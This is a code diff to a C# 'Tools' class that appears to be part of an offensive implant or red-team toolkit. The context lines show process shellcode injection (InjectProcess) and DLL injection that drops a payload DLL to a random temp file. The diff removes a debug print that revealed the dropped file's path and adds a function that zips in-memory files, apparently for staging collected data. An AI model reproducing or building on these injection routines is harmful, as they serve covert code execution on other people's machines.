@@ -11,6 +11,7 @@ using System.Management;
 using System.Security.Principal;
 using System.Runtime.Serialization.Json;
 using System.Text;
+using System.IO.Compression;
 
 
 public class Tools
@@ -69,7 +70,7 @@ public class Tools
         return NativeMethods.SpawnSystem(parentID, appName, arguments) == 0;
     }
 
-    public static bool InjectProcess(byte[] shellCode, int procid= -1, string name = null)
+    public static bool InjectProcess(byte[] shellCode, int procid = -1, string name = null) 
     {
         if (procid == -1 && name == null) 
         {
@@ -281,7 +282,6 @@ public class Tools
     public static bool DllInjection(int pid, byte[] payloadDll)
     {
         string path = GetRandomeFile(Path.GetTempPath(),"dll");
-		Console.WriteLine($"creating random file {path}");
 		File.WriteAllBytes(path, payloadDll);
         if( NativeMethods.InjectDll(pid, path) == 0)
         {
@@ -313,4 +313,34 @@ public class Tools
         }
         return result;
     }
+
+    public static byte[] ZipVirtualFolder(List<MemoryStream> VirtualFiles, string[] names)
+    {
+        byte[] result;
+		using (MemoryStream zipMemoryStream = new MemoryStream())
+		{
+			using (ZipArchive archive = new ZipArchive(zipMemoryStream, ZipArchiveMode.Create, true))
+			{
+				for (int i = 0; i < VirtualFiles.Count; i++)
+				{
+					string fileName;
+                    if (names.Length != VirtualFiles.Count)
+                    {
+                        fileName = $"file ({i})";
+                    }
+                    else
+                    {
+                        fileName = names[i];
+                    }
+					var entry = archive.CreateEntry(fileName);
+					using (Stream entryStream = entry.Open())
+					{
+						VirtualFiles[i].CopyTo(entryStream);
+					}
+				}
+			}
+			result = zipMemoryStream.ToArray();
+		}
+        return result;
+	}
 }
